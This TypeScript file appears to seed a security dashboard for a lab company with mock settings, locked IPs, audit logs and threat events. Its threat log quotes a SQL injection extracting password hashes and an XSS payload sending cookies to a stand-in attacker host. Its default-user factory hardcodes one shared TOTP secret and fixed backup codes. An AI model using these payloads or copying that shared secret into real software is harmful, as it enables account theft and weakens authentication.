import { GlobalSecuritySettings, SecurityThreatEvent, SecurityAuditItem } from '../types/security';

export const INITIAL_SECURITY_SETTINGS: GlobalSecuritySettings = {
  id: 'global-sec-bkr-labs',
  is_emergency_lockdown_active: false,
  active_preset: 'laboratory_strict',
  updated_at: new Date().toISOString(),
  updated_by: 'owner@bkresearchlabs.com',

  // 1. Transport Layer & Network Security
  transport_network: {
    ssl_enforced: true,
    min_tls_version: 'TLSv1.3',
    cipher_suites: 'strict_modern',
    enforce_https_redirect: true,
    ocsp_stapling: true,
    forward_secrecy: true,

    hsts_enabled: true,
    hsts_max_age_seconds: 31536000, // 1 year
    hsts_include_subdomains: true,
    hsts_preload: true,

    waf_enabled: true,
    waf_inspection_mode: 'active_blocking',
    waf_sqli_protection: true,
    waf_xss_protection: true,
    waf_lfi_rfi_protection: true,
    waf_bad_bot_blocking: true,
    waf_geo_blocking_enabled: false,
    waf_blocked_countries: ['RU', 'KP', 'IR'],
    waf_custom_ip_blacklist: ['185.220.101.45', '194.26.29.112', '45.154.255.89'],
    waf_custom_ip_whitelist: ['127.0.0.1', '192.168.1.0/24'],

    ddos_mitigation_enabled: true,
    ddos_protection_tier: 'enterprise_anycast',
    ddos_rate_scrubbing_threshold_req_per_sec: 250,
    ddos_challenge_mode: 'js_challenge',
    ddos_auto_mitigate: true,

    api_rate_limiting_enabled: true,
    api_rate_limit_per_minute: 120,
    api_burst_tolerance: 35,
    api_graphql_max_depth: 6,
    api_credential_stuffing_throttle_enabled: true
  },

  // 2. Authentication & Session Management
  auth_session: {
    mfa_enabled: true,
    mfa_enforce_for_roles: ['owner', 'admin', 'employee'],
    mfa_allowed_factors: ['totp', 'webauthn_fido2', 'email_otp'],
    mfa_grace_period_days: 7,
    mfa_recovery_codes_count: 8,

    rbac_strict_least_privilege: true,
    rbac_session_elevation_required: true,
    rbac_privilege_escalation_alerts: true,

    brute_force_protection_enabled: true,
    brute_force_max_failed_attempts: 5,
    brute_force_lockout_duration_minutes: 30,
    brute_force_ip_reputation_blocking: true,
    brute_force_captcha_trigger_failures: 3,

    cookie_http_only: true,
    cookie_secure_flag: true,
    cookie_same_site: 'Strict',
    cookie_domain_scoping_strict: true,

    session_inactivity_timeout_minutes: 20,
    session_absolute_timeout_hours: 12,
    session_rotate_token_on_privilege_change: true,
    session_terminate_on_browser_close: true,
    session_single_active_session_per_user: true
  },

  // 3. Data Protection & Privacy (At Rest and In Transit)
  data_privacy: {
    encryption_at_rest_enabled: true,
    encryption_algorithm: 'AES-256-GCM',
    field_level_encryption_pii: true,
    auto_key_rotation_days: 90,
    active_key_fingerprint: 'SHA256:7f3a9e1d84c0b299e5a1b32d8471c2ee40b91e921d2837',

    pci_dss_compliance_mode: 'saq_a_tokenized',
    pci_block_raw_pan_storage: true,
    pci_tokenize_all_card_data: true,
    pci_cvv_zero_retention_enforced: true,
    pci_compliance_certified: true,

    secrets_vault_provider: 'vault_aws',
    secrets_auto_scan_code_leaks: true,
    secrets_key_rotation_enabled: true,
    secrets_last_vault_audit: new Date(Date.now() - 86400000 * 2).toISOString(),

    pii_mask_emails_in_logs: true,
    pii_mask_phones_in_logs: true,
    pii_mask_credit_cards_in_logs: true,
    pii_anonymize_analytics_ips: true,
    pii_gdpr_ccpa_export_enabled: true
  },

  // 4. Mobile Application Security (Android & iOS)
  mobile_app: {
    cert_pinning_enabled: true,
    cert_pinning_sha256_hashes: [
      'pin-sha256="47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="',
      'pin-sha256="YLh1dUR9y6Kja30RrAn7JKODskIwlwu5NFeiyWC9TI="'
    ],
    cert_pinning_backup_hashes: [
      'pin-sha256="Vjs8r4z+80wjNcr1YKepWQboSIR2w6RsUwcWB4Dagw="'
    ],
    cert_pinning_allow_debug_fallback: false,

    secure_storage_ios_keychain: true,
    secure_storage_android_encrypted_prefs: true,
    secure_storage_block_jailbroken_rooted: true,

    r8_proguard_obfuscation_active: true,
    anti_tamper_rasp_active: true,
    anti_debugger_detection_active: true,
    root_jailbreak_auto_terminate: true,

    biometrics_enabled: true,
    biometrics_require_for_financial_actions: true,
    biometrics_allow_fallback_to_pin: false,
    biometrics_prompt_title: 'BKR Labs BioSecure TouchID / FaceID Authorization'
  },

  // 5. Application Code & Infrastructure Hardening
  infrastructure: {
    automated_ci_cd_sast_enabled: true,
    dependency_cve_scanning_active: true,
    block_build_on_critical_cve: true,
    last_sast_scan_timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),

    strict_server_sanitization: true,
    anti_bola_authorization_checks: true,
    html_entity_output_encoding: true,
    sql_parameterization_enforced: true,

    csp_enabled: true,
    csp_header_value: "default-src 'self'; script-src 'self' 'unsafe-inline' https://apis.google.com https://accounts.google.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; frame-ancestors 'none'; form-action 'self';",
    x_frame_options: 'DENY',
    x_content_type_options: 'nosniff',
    permissions_policy: 'camera=(self), microphone=(), geolocation=(), payment=(self)',
    referrer_policy: 'strict-origin-when-cross-origin',

    scheduled_pentest_interval_months: 3,
    auto_vulnerability_scan_daily: true,
    last_pentest_grade: 'A+',
    last_pentest_timestamp: new Date(Date.now() - 86400000 * 5).toISOString(),
    open_vulnerabilities_count: 0
  },

  // Active Locked Out IP Records
  locked_ips: [
    {
      id: 'lock-01',
      ip: '194.26.29.112',
      failed_attempts: 8,
      reason: 'Velocity threshold exceeded: 8 failed staff credential queries in 45s',
      locked_at: new Date(Date.now() - 1000 * 60 * 48).toISOString(),
      expires_at: new Date(Date.now() + 1000 * 60 * 12).toISOString(),
      country: 'NL',
      status: 'locked',
      locked_by: 'AUTH-BRUTE-04: Automated Dynamic Defense'
    },
    {
      id: 'lock-02',
      ip: '185.220.101.45',
      failed_attempts: 14,
      reason: 'Layer 7 Blind SQLi pattern injection detected on compound search',
      locked_at: new Date(Date.now() - 1000 * 60 * 95).toISOString(),
      expires_at: new Date(Date.now() + 1000 * 60 * 145).toISOString(),
      country: 'DE',
      status: 'locked',
      locked_by: 'WAF-SQLI-092: Automated WAF Jail'
    },
    {
      id: 'lock-03',
      ip: '45.154.255.89',
      failed_attempts: 6,
      reason: 'Reflected XSS payload execution attempts on review submission',
      locked_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
      expires_at: new Date(Date.now() + 1000 * 60 * 60).toISOString(),
      country: 'RO',
      status: 'locked',
      locked_by: 'WAF-XSS-018: Sanitizer Blocker'
    }
  ],

  // Monitored Security Admin Activity & Supervisor Audit Ledger
  sec_admin_logs: [
    {
      id: 'sec-act-001',
      admin_id: 'usr-sec-admin-1',
      admin_email: 'secops@bkresearchlabs.com',
      role: 'security_admin',
      action_type: 'waf_config_changed',
      action_title: 'Hardened Layer 7 WAF SQLi & Bot Inspection',
      description: 'Activated strict regex tokenization for parameter queries and blacklisted scraping user-agents.',
      target_module: 'Layer 7 WAF Engine',
      timestamp: new Date(Date.now() - 1000 * 60 * 75).toISOString(),
      ip_address: '10.0.1.42 (Internal SecOps VPN)',
      before_value: 'waf_inspection_mode=detection_only',
      after_value: 'waf_inspection_mode=active_blocking',
      supervisor_status: 'approved',
      reviewed_by: 'owner@bkresearchlabs.com',
      reviewed_at: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
      supervisor_notes: 'Verified against PCI-DSS requirement 6.4. Approved.'
    },
    {
      id: 'sec-act-002',
      admin_id: 'usr-sec-admin-1',
      admin_email: 'secops@bkresearchlabs.com',
      role: 'security_admin',
      action_type: 'rate_limit_adjusted',
      action_title: 'API Gateway Rate Threshold Adjusted',
      description: 'Tightened global rate limiter to 120 req/min with burst multiplier 35 reqs.',
      target_module: 'API Rate Limiting & DDoS',
      timestamp: new Date(Date.now() - 1000 * 60 * 160).toISOString(),
      ip_address: '10.0.1.42 (Internal SecOps VPN)',
      before_value: 'rate_limit=300 req/min',
      after_value: 'rate_limit=120 req/min',
      supervisor_status: 'approved',
      reviewed_by: 'bkresearchlabs@gmail.com',
      reviewed_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
      supervisor_notes: 'Sensible threshold for current catalog traffic.'
    },
    {
      id: 'sec-act-003',
      admin_id: 'usr-sec-admin-1',
      admin_email: 'secops@bkresearchlabs.com',
      role: 'security_admin',
      action_type: 'ip_locked',
      action_title: 'Manual IP Quarantine Executed',
      description: 'Quarantined IP 194.26.29.112 following credential stuffing telemetry alerts.',
      target_module: 'IP Lockout Defense',
      timestamp: new Date(Date.now() - 1000 * 60 * 48).toISOString(),
      ip_address: '10.0.1.42 (Internal SecOps VPN)',
      before_value: 'status=active',
      after_value: 'status=locked (30 min duration)',
      supervisor_status: 'pending_review'
    }
  ]
};

export const INITIAL_THREAT_LOGS: SecurityThreatEvent[] = [
  {
    id: 'threat-001',
    timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
    category: 'sqli',
    severity: 'critical',
    source_ip: '185.220.101.45',
    country_code: 'DE',
    endpoint: '/api/v1/compounds/query?id=99+UNION+SELECT+null,password_hash+FROM+users--',
    payload_sample: "' UNION SELECT null,password_hash FROM users--",
    action_taken: 'blocked_by_waf',
    mitigated_by_rule: 'WAF-SQLI-092: Union-Based Extraction Filter'
  },
  {
    id: 'threat-002',
    timestamp: new Date(Date.now() - 1000 * 60 * 48).toISOString(),
    category: 'brute_force',
    severity: 'high',
    source_ip: '194.26.29.112',
    country_code: 'NL',
    endpoint: '/api/v1/auth/staff-login',
    payload_sample: 'Credential Stuffing: 14 failed attempts with rotating passwords in 30s',
    action_taken: 'ip_locked_out',
    mitigated_by_rule: 'AUTH-BRUTE-04: Velocity Lockout (Threshold > 5/min)'
  },
  {
    id: 'threat-003',
    timestamp: new Date(Date.now() - 1000 * 60 * 115).toISOString(),
    category: 'xss',
    severity: 'high',
    source_ip: '45.154.255.89',
    country_code: 'RO',
    endpoint: '/api/v1/reviews/submit',
    payload_sample: '<script>fetch("https://evil.attacker.com/steal?c="+document.cookie)</script>',
    action_taken: 'blocked_by_waf',
    mitigated_by_rule: 'WAF-XSS-018: Malicious Script Tag Injection Sanitizer'
  },
  {
    id: 'threat-004',
    timestamp: new Date(Date.now() - 1000 * 60 * 240).toISOString(),
    category: 'ddos',
    severity: 'critical',
    source_ip: 'Distributed Botnet (342 IPs)',
    country_code: 'MULTI',
    endpoint: '/api/v1/products/search?q=*',
    payload_sample: 'Volumetric L7 Flooding (1,450 requests/sec surge)',
    action_taken: 'challenge_issued',
    mitigated_by_rule: 'DDOS-ANYCAST-01: Rate Scrubbing & JavaScript Proof-of-Work Challenge'
  },
  {
    id: 'threat-005',
    timestamp: new Date(Date.now() - 1000 * 60 * 380).toISOString(),
    category: 'tamper_attempt',
    severity: 'medium',
    source_ip: '172.56.21.90',
    country_code: 'US',
    endpoint: 'Android Client / APK Build #108',
    payload_sample: 'Magisk Root / Frida Dynamic Instrumentation Hook detected in memory space',
    action_taken: 'blocked_by_waf',
    mitigated_by_rule: 'MOBILE-RASP-007: Device Integrity Violation Termination'
  }
];

export const INITIAL_AUDIT_CHECKLIST: SecurityAuditItem[] = [
  {
    id: 'audit-01',
    category: 'Transport & Network',
    title: 'Modern TLS & Strong Cipher Suites',
    description: 'Enforces TLS 1.2 and TLS 1.3 with Perfect Forward Secrecy across all web, API, and mobile routes.',
    compliance_standard: 'PCI-DSS v4.0',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Maintain TLS 1.3 as primary negotiation cipher; legacy SSLv3 and TLS 1.0/1.1 remain strictly disabled.',
    is_automated_enforced: true
  },
  {
    id: 'audit-02',
    category: 'Transport & Network',
    title: 'HTTP Strict Transport Security (HSTS)',
    description: 'Forces all client browsers to communicate strictly over encrypted HTTPS with max-age=31536000 and preload.',
    compliance_standard: 'OWASP Top 10',
    status: 'passed',
    severity: 'high',
    recommendation: 'Verify HSTS preload registration at hstspreload.org.',
    is_automated_enforced: true
  },
  {
    id: 'audit-03',
    category: 'Transport & Network',
    title: 'Layer 7 Web Application Firewall (WAF)',
    description: 'Active deep packet inspection blocking SQL Injection, Cross-Site Scripting, LFI, and known CVE payloads.',
    compliance_standard: 'OWASP Top 10',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Keep signature updates automated and maintain zero false-positive bypass rules.',
    is_automated_enforced: true
  },
  {
    id: 'audit-04',
    category: 'Transport & Network',
    title: 'Anycast DDoS Mitigation & Rate Limiting',
    description: 'Volumetric and application-layer scrubbing with velocity-based IP throttling on all REST endpoints.',
    compliance_standard: 'NIST 800-53',
    status: 'passed',
    severity: 'high',
    recommendation: 'Ensure burst limits protect against credential stuffing while allowing legitimate batch orders.',
    is_automated_enforced: true
  },
  {
    id: 'audit-05',
    category: 'Auth & Session',
    title: 'Multi-Factor Authentication (MFA / 2FA)',
    description: 'Mandatory TOTP, WebAuthn/FIDO2 hardware keys, and backup recovery codes for staff and administrator accounts.',
    compliance_standard: 'SOC2 Type II',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Enforce hardware security key (YubiKey/FIDO2) enrollment for Super Administrators.',
    is_automated_enforced: true
  },
  {
    id: 'audit-06',
    category: 'Auth & Session',
    title: 'Role-Based Access Control & PoLP',
    description: 'Strict privilege segregation preventing lateral movement between customer, staff, and owner roles.',
    compliance_standard: 'ISO 27001',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Audit staff role assignments bi-monthly and revoke dormant permissions.',
    is_automated_enforced: true
  },
  {
    id: 'audit-07',
    category: 'Auth & Session',
    title: 'Brute-Force & Credential Stuffing Throttling',
    description: 'Exponential backoff and dynamic IP lockout after 5 consecutive failed authentication attempts.',
    compliance_standard: 'OWASP Top 10',
    status: 'passed',
    severity: 'high',
    recommendation: 'Maintain CAPTCHA challenge triggers on initial failed attempt.',
    is_automated_enforced: true
  },
  {
    id: 'audit-08',
    category: 'Auth & Session',
    title: 'Hardened Cookie Flags (HttpOnly, Secure, SameSite)',
    description: 'Prevents client-side script token harvesting (XSS) and CSRF attacks by locking cookie transport headers.',
    compliance_standard: 'OWASP Top 10',
    status: 'passed',
    severity: 'high',
    recommendation: 'Enforce SameSite=Strict on all state-altering session tokens.',
    is_automated_enforced: true
  },
  {
    id: 'audit-09',
    category: 'Data & Privacy',
    title: 'AES-256-GCM Encryption at Rest',
    description: 'Database tables, laboratory files, customer records, and backups encrypted with hardware-accelerated AES-256.',
    compliance_standard: 'PCI-DSS v4.0',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Keep automated key rotation active on a 90-day cryptographic cycle.',
    is_automated_enforced: true
  },
  {
    id: 'audit-10',
    category: 'Data & Privacy',
    title: 'PCI-DSS SAQ-A Tokenization Offloading',
    description: 'Cardholder data is tokenized directly via Authorize.Net / Stripe / Mesh Crypto gateways; zero PAN stored on server.',
    compliance_standard: 'PCI-DSS v4.0',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Maintain zero retention of CVV2 / CVC codes in any log or temporary storage buffer.',
    is_automated_enforced: true
  },
  {
    id: 'audit-11',
    category: 'Data & Privacy',
    title: 'Hardware Vault Secrets Management',
    description: 'Cryptographic API keys, gateway tokens, and database passwords isolated in dedicated secrets manager.',
    compliance_standard: 'SOC2 Type II',
    status: 'passed',
    severity: 'high',
    recommendation: 'Run continuous static code scanners to detect accidental repository credential commits.',
    is_automated_enforced: true
  },
  {
    id: 'audit-12',
    category: 'Data & Privacy',
    title: 'Data Minimization & PII Masking',
    description: 'Customer phone numbers, emails, and financial identifiers are masked in all access and error logs.',
    compliance_standard: 'GDPR/CCPA',
    status: 'passed',
    severity: 'medium',
    recommendation: 'Ensure GDPR/CCPA data export and right-to-be-forgotten deletion workflows remain operational.',
    is_automated_enforced: true
  },
  {
    id: 'audit-13',
    category: 'Mobile Apps',
    title: 'SSL / TLS Certificate Pinning',
    description: 'Android APK and iOS IPA binaries enforce SHA-256 public key pinning to prevent MitM interception via rogue root CAs.',
    compliance_standard: 'OWASP Top 10',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Maintain backup certificate pins to prevent app lockout during TLS certificate renewals.',
    is_automated_enforced: true
  },
  {
    id: 'audit-14',
    category: 'Mobile Apps',
    title: 'Platform-Secure Enclave & Encrypted Storage',
    description: 'iOS Keychain and Android EncryptedSharedPreferences used exclusively for session keys.',
    compliance_standard: 'NIST 800-53',
    status: 'passed',
    severity: 'high',
    recommendation: 'Block app launch on compromised, rooted, or jailbroken mobile environments.',
    is_automated_enforced: true
  },
  {
    id: 'audit-15',
    category: 'Mobile Apps',
    title: 'Code Obfuscation & RASP Tamper Protection',
    description: 'ProGuard/R8 bytecode obfuscation and runtime debugger hook detection deployed in native app binaries.',
    compliance_standard: 'ISO 27001',
    status: 'passed',
    severity: 'medium',
    recommendation: 'Monitor automated mobile crash telemetries for reverse-engineering attempts.',
    is_automated_enforced: true
  },
  {
    id: 'audit-16',
    category: 'Infra & Hardening',
    title: 'Automated CI/CD SAST & SCA Scanning',
    description: 'Static application security testing and dependency vulnerability scanning integrated into deployment pipelines.',
    compliance_standard: 'SOC2 Type II',
    status: 'passed',
    severity: 'high',
    recommendation: 'Automatically halt production deployments if critical CVE vulnerabilities are identified.',
    is_automated_enforced: true
  },
  {
    id: 'audit-17',
    category: 'Infra & Hardening',
    title: 'Server-Side Input Sanitization & Anti-BOLA',
    description: 'Strict schema validation and broken object-level authorization verification on all data mutation handlers.',
    compliance_standard: 'OWASP Top 10',
    status: 'passed',
    severity: 'critical',
    recommendation: 'Enforce parameterized database queries and output entity encoding on all user inputs.',
    is_automated_enforced: true
  },
  {
    id: 'audit-18',
    category: 'Infra & Hardening',
    title: 'HTTP Security Headers & Content Security Policy',
    description: 'Strict CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, and Permissions-Policy headers active.',
    compliance_standard: 'OWASP Top 10',
    status: 'passed',
    severity: 'high',
    recommendation: 'Audit CSP directive violations via reporting endpoints.',
    is_automated_enforced: true
  }
];

// ============================================================================
// DEFAULT USER ACCOUNT SECURITY & REGISTERED HARDWARE KEYS
// ============================================================================

import { UserAccountSecurity, RegisteredHardwareKey, UserActiveSessionDevice } from '../types/security';

export function createDefaultUserAccountSecurity(userId: string, userEmail: string, role = 'admin'): UserAccountSecurity {
  const isElevated = role === 'admin' || role === 'owner';

  const defaultKeys: RegisteredHardwareKey[] = isElevated ? [
    {
      id: 'key-yk-01',
      name: 'Primary YubiKey 5C NFC (Laboratory Key)',
      device_type: 'yubikey_5_nfc',
      transport: 'usb',
      credential_id: 'cred_yk5c_77a941f0e2b8',
      public_key_algo: 'ES256 (ECDSA P-256 NIST)',
      aaguid: 'cbfe0a44-b5d9-4ca9-a838-3ddcf080ece2',
      created_at: new Date(Date.now() - 45 * 24 * 3600 * 1000).toISOString(),
      last_authenticated_at: new Date(Date.now() - 2 * 3600 * 1000).toISOString(),
      usage_count: 84,
      is_backed_up: true,
      status: 'active'
    },
    {
      id: 'key-biometric-02',
      name: 'MacBook Pro Touch ID (Secure Enclave)',
      device_type: 'touch_id',
      transport: 'internal',
      credential_id: 'cred_apple_se_8829c40b',
      public_key_algo: 'ES256 (Apple Secure Enclave FIDO2)',
      aaguid: '00000000-0000-0000-0000-000000000000',
      created_at: new Date(Date.now() - 30 * 24 * 3600 * 1000).toISOString(),
      last_authenticated_at: new Date(Date.now() - 15 * 60 * 1000).toISOString(),
      usage_count: 142,
      is_backed_up: false,
      status: 'active'
    }
  ] : [
    {
      id: 'key-user-01',
      name: 'FIDO2 / WebAuthn Biometric Authenticator',
      device_type: 'touch_id',
      transport: 'internal',
      credential_id: 'cred_fido2_bio_3910f',
      public_key_algo: 'ES256 (ECDSA P-256)',
      created_at: new Date(Date.now() - 14 * 24 * 3600 * 1000).toISOString(),
      last_authenticated_at: new Date(Date.now() - 24 * 3600 * 1000).toISOString(),
      usage_count: 19,
      is_backed_up: false,
      status: 'active'
    }
  ];

  const defaultDevices: UserActiveSessionDevice[] = [
    {
      id: 'dev-curr-session',
      device_name: 'Current Browser Workspace',
      device_icon: 'laptop',
      browser: 'Chrome 128.0.0 (x86_64)',
      os: 'macOS Sonoma 14.6',
      ip_address: '198.51.100.42 (Edge Proxy)',
      location: 'Boston, Massachusetts, US',
      is_current_session: true,
      last_active_at: new Date().toISOString(),
      sign_in_method: 'totp',
      created_at: new Date(Date.now() - 3 * 3600 * 1000).toISOString(),
      trusted_status: 'trusted'
    },
    {
      id: 'dev-iphone-mobile',
      device_name: 'iPhone 15 Pro Max (BKRL Mobile)',
      device_icon: 'smartphone',
      browser: 'Mobile Safari / iOS WebKit',
      os: 'iOS 17.6.1',
      ip_address: '203.0.113.88 (Cellular ASN)',
      location: 'Cambridge, Massachusetts, US',
      is_current_session: false,
      last_active_at: new Date(Date.now() - 8 * 3600 * 1000).toISOString(),
      sign_in_method: 'hardware_key',
      created_at: new Date(Date.now() - 12 * 24 * 3600 * 1000).toISOString(),
      trusted_status: 'trusted'
    },
    {
      id: 'dev-lab-tablet',
      device_name: 'Laboratory Station Tablet #4',
      device_icon: 'tablet',
      browser: 'Chrome Android 127',
      os: 'Android 14 (Samsung Knox)',
      ip_address: '10.200.4.12 (Lab Intranet)',
      location: 'BKRL Cleanroom 2B, Boston, US',
      is_current_session: false,
      last_active_at: new Date(Date.now() - 36 * 3600 * 1000).toISOString(),
      sign_in_method: 'totp',
      created_at: new Date(Date.now() - 25 * 24 * 3600 * 1000).toISOString(),
      trusted_status: 'trusted'
    }
  ];

  return {
    user_id: userId,
    user_email: userEmail,
    totp_enabled: isElevated,
    totp_secret: 'JBSWY3DPEHPK3PXP', // Base32 default seed
    totp_created_at: isElevated ? new Date(Date.now() - 60 * 24 * 3600 * 1000).toISOString() : undefined,
    totp_algorithm: 'SHA1',
    totp_digits: 6,
    totp_period_seconds: 30,
    backup_codes: [
      '8A4F-29C1',
      '9E3B-74D0',
      '5C1A-88E2',
      '7D0F-33A9',
      '2B9C-61E4',
      '4E8A-15D3',
      '6F2D-90B7',
      '3A7E-48C5'
    ],
    backup_codes_remaining: 8,
    hardware_keys: defaultKeys,
    active_devices: defaultDevices,
    preferences: {
      require_mfa_every_login: true,
      remember_device_days: 30,
      require_hardware_key_for_sensitive_ops: isElevated,
      email_alerts_new_device: true,
      email_alerts_security_changes: true,
      auto_logout_inactivity_minutes: 30
    },
    last_security_audit_at: new Date().toISOString()
  };
}

